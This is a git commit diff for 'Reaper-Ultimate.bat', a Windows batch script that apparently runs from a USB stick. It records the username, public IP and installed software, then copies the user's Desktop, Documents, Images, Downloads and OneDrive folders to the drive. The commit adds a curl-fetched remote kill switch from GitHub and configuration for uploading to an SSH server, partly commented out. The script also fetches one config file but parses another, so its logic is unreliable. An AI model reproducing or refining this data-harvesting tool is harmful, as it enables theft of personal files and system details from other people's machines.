c8aca8ff1ddac3e91a02deae69ce9ccf9a949375
raf181_ <93051606+raf181@users.noreply.github.com>
2023-05-11 17:42:46 +0200

    Reaper 1.1
    created the Reaper kill switch, moved all the features in to one script. removes all testing files

--- Reaper-Ultimate.bat
+++ Reaper-Ultimate.bat
@@ -1,7 +1,96 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set /p usb_drive="Please enter the drive letter of your USB: "
+@echo off
+
+:: Set the URL of the configuration file on GitHub
+set "configUrl=https://raw.githubusercontent.com/AROA-DEV/Reaper/Testing/Config/Reaper-config.cfg"
+
+:: Fetch the configuration file contents using curl
+for /f "delims=" %%i in ('curl -s "%configUrl%"') do (
+    :: Check if the line "Active=true" exists in the configuration file
+    echo %%i | findstr /i "Active=true" >nul
+    if %errorlevel% equ 0 (
+        :: The line "Active=true" is found
+        echo Configuration file is active. Running the script...
+        goto Active
+    ) else (
+        :: The line "Active=true" is not found or is set to "Active=false"
+        echo remote configuration file is not active. Exiting...
+        echo.
+        :: uncomment the following line to enable local configuration file 
+        :: echo cheking for local configuration file...
+        :: echo.
+        :: goto Local
+        sleep 5
+        exit /b 0
+    )
+)
+
+:: The script will only reach this point if the remote configuration file is inaccessible or has an unknown format.
+:Local
+:: Check if a local configuration file exists
+if exist "Reaper-config.cfg" (
+    :: Local configuration file exists
+    echo Local configuration file found. Checking if it is active...
+
+    :: Check if the line "Active=true" exists in the local configuration file
+    findstr /i "Active=true" "Reaper-config.cfg" >nul
+    if %errorlevel% equ 0 (
+        :: The line "Active=true" is found in the local configuration file
+        echo Local configuration file is active. Running the script...
+        goto Active
+    ) else (
+        :: The line "Active=true" is not found or is set to "Active=false" in the local configuration file
+        echo Local configuration file is not active. Exiting...
+        sleep 5
+        exit /b 0
+    )
+) else (
+    :: Local configuration file does not exist
+    echo Local configuration file not found. Exiting...
+    sleep 5
+    exit /b 0
+)
+
+:Active
+:: Read the remote configuration file
+for /f "usebackq tokens=1* delims== " %%a in ("remote_config.cfg") do (
+    if /i "%%a"=="TARGET_SERVER" (
+        :: Get the target server from the remote configuration
+        set "target_server=%%b"
+    ) else if /i "%%a"=="TARGET_PORT" (
+        :: Get the target server port from the remote configuration
+        set "target_port=%%b"
+    ) else if /i "%%a"=="TARGET_FOLDER" (
+        :: Get the target folder path from the remote configuration
+        set "target_folder=%%b"
+    ) else if /i "%%a"=="COPY_FILES" (
+        :: Get the choice to copy files from the remote configuration
+        set "CopyFiles=%%b"
+    )
+)
+
+:: Validate if all the required variables are set
+if not defined target_server (
+    echo TARGET_SERVER is not set in the remote configuration file.
+    exit /b 1
+)
+
+if not defined target_port (
+    echo TARGET PORT is not set in the remote configuration file. will use default port 22
+    set "target_port=22"  :: Set default port to 22 if not specified in the remote configuration
+)
+
+if not defined target_folder (
+    echo TARGET_FOLDER is not set in the remote configuration file.
+    exit /b 1
+)
+
+:: set usb leter
+:: set /p usb_drive="Please enter the drive letter of your USB: "
+FOR /F "tokens=*" %%g IN ('cd') do (SET usb_drive=%%g)
+echo %usb_drive%
 
 :: Get machine name
 set filename=%USERNAME%.txt
@@ -19,7 +108,8 @@ echo Public IP: %publicIP% >> %filename%
 :: Get list of installed apps
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | find "DisplayName" >> %filename%
 
-:: uncomet lines with " " to activate the feature
+:: uncomet lines with ":: #deactivated " to activate copying files to SSH server
+
 :: copy the private key to the users .ssh folder
 :: #deactivated xcopy /E /Y "%usb_drive%:\id_rsa" "%USERPROFILE%\.ssh\"
 :: Set target server
@@ -58,19 +148,18 @@ if /i "%CopyFiles%"=="n" (
 )
 
 :: Delete the private key from the users .ssh folder        
-del "%USERPROFILE%\.ssh\id_rsa"
-del "%USERPROFILE%\.ssh\known_hosts"
-del "%USERPROFILE%\.ssh\known_hosts.old"
+:: #deactivated del "%USERPROFILE%\.ssh\id_rsa"
+:: #deactivated del "%USERPROFILE%\.ssh\known_hosts"
+:: #deactivated del "%USERPROFILE%\.ssh\known_hosts.old"
 
 set dest_folder="%usb_drive%:\%USERNAME%"
 
 md "%dest_folder%"
-
+xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"
 xcopy /E /Y "%desktop%" "%dest_folder%\Desktop\"
 xcopy /E /Y "%documents%" "%dest_folder%\Documents\"
 xcopy /E /Y "%images%" "%dest_folder%\Images\"
 xcopy /E /Y "%downloads%" "%dest_folder%\Downloads\"
-xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"
 
 echo Files copied successfully!
 
